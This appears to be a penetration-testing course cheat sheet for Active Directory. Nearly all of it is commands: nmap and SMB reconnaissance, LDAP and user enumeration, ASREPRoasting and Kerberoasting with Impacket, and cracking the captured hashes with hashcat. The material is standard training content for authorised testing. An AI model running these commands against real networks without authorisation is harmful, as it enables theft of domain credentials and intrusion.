# Active Directory Cheat sheet - ITHS2023


## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
  - [ASREPRoasting](#asreproasting)
  - [Kerberoasting](#kerberoasting)
- [Post-Exploitation](#post-exploitation)
- [Resources](#resources)

## Overview
More to come...

## Reconnaissance

### Network Enumeration
- **Enumerate SMB across a subnet:**
  ```bash
  netexec smb 10.2.10.1/24
  ```

### Nmap Scans
- **Ping scan:**
  ```bash
  nmap -sP -p
  ```
- **Quick scan:**
  ```bash
  nmap -PN -sV --top-ports 50 --open
  ```
- **SMB vulnerability scan:**
  ```bash
  nmap -PN --script smb-vuln* -p139,445
  ```
- **Classic scan:**
  ```bash
  nmap -PN -sC -sV -oA
  ```
- **Full scan:**
  ```bash
  nmap -PN -sC -sV -p- -oA
  ```
- **UDP scan:**
  ```bash
  nmap -sU -sC -sV -oA
  ```
- **Scan with no ping and save output:**
  ```bash
  nmap -sC -sV -Pn -p- -oA filename -vv
  ```

## Enumeration

### LDAP Enumeration
- **Basic LDAP search:**
  ```bash
  ldapsearch -x -h <ip> -s base
  ```
- **Nmap LDAP enumeration:**
  ```bash
  nmap -n -sV --script "ldap* and not brute" -p 389 <dc_ip>
  ```

### SMB Enumeration
- **Null session enumeration:**
  ```bash
  enum4linux -a -u "" -p ""
  ```
- **Guest session enumeration:**
  ```bash
  enum4linux -a -u "guest" -p ""
  ```
- **Check SMB shares and permissions:**
  ```bash
  smbmap -u "" -p "" -P 445 -H <ip>
  ```
- **Connect to SMB server:**
  ```bash
  impacket-smbclient domain/user@<ip>
  ```

### User Enumeration
- **List users on the domain:**
  ```bash
  enum4linux -U | grep 'user:'
  ```
- **Retrieve users via netexec:**
  ```bash
  netexec smb --users
  ```
- **Enumerate domain users via net RPC:**
  ```bash
  net rpc group members 'Domain Users' -W '' -I '' -U '%'
  ```
- **Enumerate Kerberos users:**
  ```bash
  nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='',userdb=<users_list_file>"
  ```

## Exploitation

### ASREPRoasting
- **Find users without Kerberos preauthentication enabled and save hashes:**
  ```bash
  impacket-GetNPUsers domain/ -usersfile userfile.txt -format hashcat -outputfile hashfile
  ```
- **Crack hashes using hashcat:**
  ```bash
  hashcat -m 18200 hashes wordlist.txt
  ```

### Kerberoasting
- **List users with SPNs:**
  ```bash
  impacket-GetUserSPNs domain/user:password
  ```
- **Save Kerberoast hashes:**
  ```bash
  impacket-GetUserSPNs domain/user:password -outputfile hashes -request
  ```
- **Alternative approach using netexec:**
  ```bash
  netexec ldap <dc_ip> -u <user> -p <password> -d <domain> --kerberoasting KERBEROASTING
  ```

## Post-Exploitation

- **Extract user list for OSINT:**
  Use gathered usernames for further reconnaissance on the internet to identify related information.

## Resources

- [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
- [Hashcat Official Website](https://hashcat.net/hashcat/)
- [Nmap Official Documentation](https://nmap.org/docs.html)
- [enum4linux GitHub Repository](https://github.com/CiscoCXSecurity/enum4linux)

---

